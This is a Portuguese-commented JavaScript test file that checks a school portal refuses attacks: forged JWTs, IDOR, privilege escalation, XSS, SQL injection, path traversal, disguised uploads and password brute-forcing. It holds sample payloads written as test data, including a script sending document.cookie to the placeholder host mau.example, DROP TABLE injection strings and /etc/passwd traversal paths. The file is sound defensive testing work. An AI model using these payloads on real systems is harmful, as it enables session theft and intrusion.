import { describe, it, before, after } from 'node:test'
import assert from 'node:assert/strict'
import jwt from 'jsonwebtoken'
import { criarAmbiente } from '../apoio/ambiente.js'

/*
  Testes de intrusão ao portal, do ponto de vista de quem ataca: sessões falsificadas, ver ou mudar o que
  é de outros (IDOR), subir de privilégios, injetar código, enviar ficheiros perigosos e forçar palavras-passe.
  Cada ataque tem de falhar.
*/
const NOVA = 'Portal2026segura'
const PDF = Buffer.from('%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n')
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url')

describe('ataques ao portal: tudo tem de ser recusado', () => {
  let amb, c1, c2, turma1, entregaAna, trabalho
  const contas = {}
  const tokens = {}
  const como = (quem) => amb.com(tokens[quem])

  before(async () => {
    amb = await criarAmbiente()
    const admin = await amb.entrar()
    await amb.com(admin).post('/api/admin/colecoes/cursos').send({ nome: 'Curso de Estado-Maior' })
    const s = await amb.criarUtilizador('administrador')
    const sec = () => amb.com(s.token)
    turma1 = (await sec().post('/api/admin/academico/turmas').send({ curso: 'curso-de-estado-maior', anoLetivo: '2026/2027', nome: 'CEM A' })).body
    const turma2 = (await sec().post('/api/admin/academico/turmas').send({ curso: 'curso-de-estado-maior', anoLetivo: '2026/2027', nome: 'CEM B' })).body
    for (const k of ['profa', 'profb']) contas[k] = (await sec().post('/api/admin/academico/contas').send({ tipo: 'docente', nome: `Docente ${k} Teste`, email: `${k}@esgfaa.gov.ao` })).body
    for (const k of ['ana', 'bruno', 'dina']) contas[k] = (await amb.registarEMatricular(sec(), turma1.id, { nome: `Estudante ${k} Teste`, email: `${k}@esgfaa.gov.ao` })).body
    contas.carla = (await amb.registarEMatricular(sec(), turma2.id, { nome: 'Estudante carla Teste', email: 'carla@esgfaa.gov.ao' })).body
    c1 = (await sec().post(`/api/admin/academico/turmas/${turma1.id}/cadeiras`).send({ codigo: 'EST101', nome: 'Estratégia' })).body
    c2 = (await sec().post(`/api/admin/academico/turmas/${turma2.id}/cadeiras`).send({ codigo: 'GEO103', nome: 'Geopolítica' })).body
    await sec().put(`/api/admin/academico/cadeiras/${c1.id}/docentes`).send({ docentes: [{ docenteId: contas.profa.id, papel: 'regente' }] })
    await sec().put(`/api/admin/academico/cadeiras/${c2.id}/docentes`).send({ docentes: [{ docenteId: contas.profb.id, papel: 'regente' }] })
    for (const k of ['profa', 'profb', 'ana', 'bruno', 'carla', 'dina']) {
      const email = `${k}@esgfaa.gov.ao`
      const r = await amb.http().post('/api/portal/entrar').send({ email, senha: email })
      tokens[k] = (await amb.com(r.body.token).put('/api/portal/eu/senha').send({ atual: email, nova: NOVA })).body.token
    }
    tokens.admin = admin
    trabalho = (await como('profa').post(`/api/portal/cadeiras/${c1.id}/trabalhos`).send({ titulo: 'Ensaio', prazo: '2030-11-20T23:59:00Z' })).body
    entregaAna = (await como('ana').post(`/api/portal/trabalhos/${trabalho.id}/entrega`).attach('ficheiro', PDF, { filename: 'ensaio.pdf', contentType: 'application/pdf' })).body
  })
  after(() => amb.fechar())

  it('sessões falsificadas: sem assinatura, outra chave, dados alterados, token do painel no portal e vice-versa', async () => {
    const verdadeiro = jwt.decode(tokens.ana)
    const semAssinatura = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ ...verdadeiro, sub: String(contas.profa.id) })}.`
    const outraChave = jwt.sign({ ver: verdadeiro.ver }, 'uma-chave-qualquer-que-o-atacante-inventou-123', { subject: String(contas.profa.id), audience: verdadeiro.aud, issuer: verdadeiro.iss, jwtid: 'x' })
    const [cab, , ass] = tokens.ana.split('.')
    const adulterado = `${cab}.${b64({ ...verdadeiro, sub: String(contas.profa.id) })}.${ass}`
    for (const t of [semAssinatura, outraChave, adulterado, tokens.admin, 'lixo', `${tokens.ana}x`]) {
      assert.equal((await amb.com(t).get('/api/portal/eu')).status, 401, `aceitou: ${t.slice(0, 30)}`)
    }
    assert.equal((await amb.com(tokens.ana).get('/api/admin/eu')).status, 401)
    // e depois de sair, o mesmo token deixa de servir
    const r = await amb.http().post('/api/portal/entrar').send({ email: 'bruno@esgfaa.gov.ao', senha: NOVA })
    await amb.com(r.body.token).post('/api/portal/sair')
    assert.equal((await amb.com(r.body.token).get('/api/portal/eu')).status, 401)
  })

  it('ver o que é de outros (IDOR): cadeira de outra turma, ficheiros e entregas alheias, pautas', async () => {
    assert.ok([403, 404].includes((await como('carla').get(`/api/portal/cadeiras/${c1.id}`)).status))
    const fich = entregaAna.ficheiros[0].id
    assert.equal((await como('bruno').get(`/api/portal/ficheiros/${fich}`)).status, 404) // colega da mesma turma
    assert.equal((await como('carla').get(`/api/portal/ficheiros/${fich}`)).status, 404)
    assert.ok([403, 404].includes((await como('profb').get(`/api/portal/ficheiros/${fich}`)).status)) // docente de outra cadeira
    assert.equal((await como('ana').get(`/api/portal/ficheiros/${fich}`)).status, 200)
    for (const url of [`/api/portal/trabalhos/${trabalho.id}/entregas`, `/api/portal/cadeiras/${c1.id}/pauta`, `/api/portal/cadeiras/${c1.id}/relatorios/registos`]) {
      assert.ok([403, 404].includes((await como('bruno').get(url)).status), `estudante viu ${url}`)
      assert.ok([403, 404].includes((await como('profb').get(url)).status), `docente de outra cadeira viu ${url}`)
    }
  })

  it('subir de privilégios: estudante a dar-se nota ou a criar atividades; docente a mexer na cadeira de outro', async () => {
    assert.ok([403, 404].includes((await como('ana').put(`/api/portal/entregas/${entregaAna.id}`).send({ nota: 20 })).status))
    assert.ok([403, 404].includes((await como('ana').post(`/api/portal/cadeiras/${c1.id}/trabalhos`).send({ titulo: 'X', prazo: '2030-01-01T00:00:00Z' })).status))
    assert.ok([403, 404].includes((await como('ana').put(`/api/portal/cadeiras/${c1.id}/pauta`).send({ linhas: [{ estudanteId: contas.ana.id, p1: 20 }] })).status))
    assert.ok([403, 404].includes((await como('profb').put(`/api/portal/entregas/${entregaAna.id}`).send({ nota: 0 })).status))
    assert.ok([403, 404].includes((await como('profb').post(`/api/portal/cadeiras/${c1.id}/avisos`).send({ titulo: 'Falso', texto: 'Aviso falso' })).status))
    assert.ok([403, 404].includes((await como('profb').delete(`/api/portal/trabalhos/${trabalho.id}`)).status))
    // nada mudou
    const linhas = (await como('profa').get(`/api/portal/trabalhos/${trabalho.id}/entregas`)).body.linhas
    assert.equal(linhas.find((l) => l.estudante.id === contas.ana.id).entrega.nota, null)
  })

  it('código malicioso numa página: os scripts, eventos e ligações javascript: são retirados', async () => {
    const html = '<p>Olá</p><script>fetch("https://mau.example/?c="+document.cookie)</script><img src="x" onerror="alert(1)"><a href="javascript:alert(1)">clique</a><iframe src="https://mau.example"></iframe>'
    const r = await como('profa').post(`/api/portal/cadeiras/${c1.id}/materiais`).send({ tipo: 'pagina', titulo: 'Página', conteudo: html })
    assert.equal(r.status, 201, r.body.erro)
    assert.match(r.body.conteudo, /<p>Olá<\/p>/)
    for (const mau of ['<script', 'onerror', 'javascript:', 'mau.example']) assert.ok(!r.body.conteudo.includes(mau), `ficou ${mau}`)
  })

  it('injeção na pesquisa e nos parâmetros; caminhos fora da pasta', async () => {
    for (const q of ["' OR 1=1 --", '"; DROP TABLE contas_portal; --', '%', '\\']) {
      const r = await como('carla').get(`/api/portal/pesquisa?q=${encodeURIComponent(q)}`)
      assert.ok([200, 400].includes(r.status))
      assert.ok(!JSON.stringify(r.body).includes('Estratégia'), 'a pesquisa mostrou uma cadeira de outra turma')
    }
    for (const id of ['1 OR 1=1', '../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '-1', '9999999999999999999']) {
      assert.ok([400, 404].includes((await como('ana').get(`/api/portal/cadeiras/${encodeURIComponent(id)}`)).status))
      assert.ok([400, 404].includes((await como('ana').get(`/api/portal/ficheiros/${encodeURIComponent(id)}`)).status))
    }
    assert.equal((await amb.http().get('/uploads/../package.json')).status, 404)
  })

  it('ficheiros perigosos na entrega: página web ou programa com nome de PDF', async () => {
    const t = (await como('profa').post(`/api/portal/cadeiras/${c1.id}/trabalhos`).send({ titulo: 'Outro', prazo: '2030-11-20T23:59:00Z' })).body
    for (const [conteudo, nome, tipo] of [
      [Buffer.from('<html><script>alert(1)</script></html>'), 'trabalho.pdf', 'application/pdf'],
      [Buffer.from('MZ\x90\x00\x03\x00\x00\x00'), 'trabalho.pdf', 'application/pdf'],
      [Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'), 'trabalho.svg', 'image/svg+xml'],
    ]) {
      const r = await como('bruno').post(`/api/portal/trabalhos/${t.id}/entrega`).attach('ficheiro', conteudo, { filename: nome, contentType: tipo })
      assert.equal(r.status, 400, `aceitou ${nome} com ${conteudo.slice(0, 10)}`)
    }
  })

  it('palavras-passe à força: a conta bloqueia, e a mensagem não revela se o e-mail existe', async () => {
    const tentar = (email, senha) => amb.http().post('/api/portal/entrar').send({ email, senha })
    const inexistente = await tentar('ninguem@esgfaa.gov.ao', 'Errada12345')
    const errada = await tentar('dina@esgfaa.gov.ao', 'Errada12345')
    assert.equal(inexistente.status, errada.status)
    assert.equal(inexistente.body.erro, errada.body.erro)
    let ultima
    for (let i = 0; i < 6; i++) ultima = await tentar('dina@esgfaa.gov.ao', `Errada${i}2345`)
    assert.equal(ultima.status, 423)
    // bloqueada: nem a palavra-passe certa entra
    assert.equal((await tentar('dina@esgfaa.gov.ao', NOVA)).status, 423)
  })
})
